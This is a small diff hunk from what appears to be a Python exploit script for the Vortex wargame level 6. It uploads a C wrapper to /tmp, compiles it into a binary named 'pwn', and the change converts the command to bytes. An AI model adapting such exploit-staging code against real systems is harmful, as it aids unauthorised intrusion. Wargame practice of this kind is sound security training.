@@ -25,7 +25,7 @@ def setup_payload(sh):
     sh.upload_file("./serverwrapper.c")
     time.sleep(0.05)
     w = log.progress("Compiling vortex 6 wrapper...")
-    shell.sendline("gcc -m32 /tmp/tald6/serverwrapper.c -o /tmp/tald6/pwn")
+    shell.sendline(b'gcc -m32 /tmp/tald6/serverwrapper.c -o /tmp/tald6/pwn')
     w.success("compiled")
 
 def execute_payload(sh):
